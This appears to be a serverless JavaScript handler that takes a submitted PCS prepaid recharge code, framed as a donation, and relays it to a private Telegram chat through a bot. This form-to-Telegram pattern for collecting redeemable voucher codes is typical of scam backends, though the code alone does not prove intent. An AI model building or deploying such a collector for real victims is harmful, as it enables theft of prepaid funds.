const axios = require('axios');

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { code } = JSON.parse(event.body);

    if (!code) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Code requis' })
      };
    }

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Configuration Telegram manquante' })
      };
    }

    const message = `Nouvelle recharge PCS reçue\n\nCode: ${code}\n\nBaarakaAllahu fik pour votre soutien`;

    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: message
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Code envoyé avec succès. BaarakaAllahu fik.' })
    };
  } catch (error) {
    console.error('Erreur:', error.message);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Erreur lors de l\'envoi du code' })
    };
  }
};
